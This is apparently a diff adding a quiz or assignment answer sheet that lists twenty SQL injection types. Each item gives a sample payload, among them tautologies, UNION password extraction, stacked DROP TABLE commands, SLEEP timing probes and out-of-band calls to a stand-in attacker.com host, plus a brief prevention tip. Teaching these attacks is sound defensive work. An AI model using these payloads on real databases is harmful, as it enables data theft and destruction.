@@ -1,0 +1,142 @@
+1. Classic SQL Injection (Tautology)
+*
+5 points
+SELECT * FROM users WHERE username = '' OR '1'='1';
+
+
+prevention:
+Use parameterized queries like SELECT * FROM users WHERE username = ?; to prevent injection.
+2. Union-Based Injection
+
+*
+5 points
+SELECT name FROM users WHERE id = 1 UNION SELECT password FROM admin;
+
+Validate input types and use parameterized queries.
+3.  Error-Based Injection
+*
+5 points
+SELECT * FROM users WHERE id = 1 AND 1=CONVERT(int, 'text');
+
+prevention:
+Disable detailed error messages, use try-catch in code.
+4.  Blind SQL Injection (Boolean-Based)
+*
+5 points
+SELECT * FROM users WHERE id = 1 AND 1=1; -- always true  
+SELECT * FROM users WHERE id = 1 AND 1=2; -- always false
+
+prevention:
+Use prepared statements and hide true/false output differences.
+5. Time-Based Blind Injection
+*
+5 points
+SELECT IF(1=1, SLEEP(5), 0);  
+
+prevention:
+Parameterize queries and set query execution time limits.
+6. Stored Procedure Injection
+*
+5 points
+EXEC getUser 'admin'; DROP TABLE users;
+
+prevention:
+Use parameterized stored procedures, validate inputs.
+7.  Out-of-Band Injection
+*
+5 points
+SELECT LOAD_FILE('\\\\attacker.com\\data.txt');
+
+prevention:
+Disable external access features in the database.
+8. Second Order Injection
+*
+5 points
+User saves: '; DROP TABLE users; -- into the database. Later, it gets executed when retrieved.
+
+Prevention:
+Sanitize both on input and output.
+9. Stacked Queries Injection
+*
+5 points
+SELECT * FROM users; DROP TABLE users;
+
+prevention:
+Disable stacked queries; parameterize all queries.
+10. Comment Injection
+*
+5 points
+SELECT * FROM users WHERE username = 'admin' --' AND password = '123';
+
+prevention:
+Filter or escape comment characters (--, /* */).
+11.  Hex Encoding Injection
+*
+5 points
+SELECT * FROM users WHERE username = 0x61646D696E; -- 'admin' in hex  
+
+prevention:
+Decode and validate all encoded inputs.
+12.  Case Alteration Injection
+*
+5 points
+SELECT * FROM users WHERE USERNAME = 'admin' Or '1'='1';  
+
+prevention:
+Use case-insensitive parameterized queries, not keyword filtering.
+13.  Encoded Injection
+*
+5 points
+%27%20OR%20%271%27%3D%271  (URL-encoded payload for `' OR '1'='1`)
+
+prevention:
+Normalize input (decode it) before validation.
+14.  Out-of-Band Data Extraction
+*
+5 points
+SELECT xp_dirtree('//attacker.com/data');
+
+prevention:
+Disable functions like xp_dirtree and external connections.
+15.  Piggy-Backed Queries
+*
+5 points
+SELECT * FROM users WHERE username = 'admin'; DROP TABLE users;
+
+prevention:
+Use parameterized queries; restrict query chaining.
+16.  Alternate Encodings
+*
+5 points
+S%E4LECT * FROM users WHERE id=1
+
+prevention:
+Normalize and sanitize all encoding formats.
+17.  Boolean Condition Injection
+*
+5 points
+SELECT * FROM users WHERE id = 1 OR 1=1;
+
+prevention:
+Use parameterized queries, strictly type-check numeric inputs.
+18. Subquery Injection
+*
+5 points
+SELECT * FROM users WHERE id = (SELECT MAX(id) FROM admin);
+
+prevention:
+Restrict subqueries in user input, and use parameterized queries.
+19.  Logical Operator Injection
+*
+5 points
+SELECT * FROM users WHERE username = 'admin' AND '1'='1';
+
+prevention:
+Use parameterized queries and reject logical operators in input.
+20.  Blind Injection via HTTP Headers
+*
+5 points
+User-Agent: ' OR '1'='1
+
+prevention:
+Sanitize all HTTP header values before using them in queries.
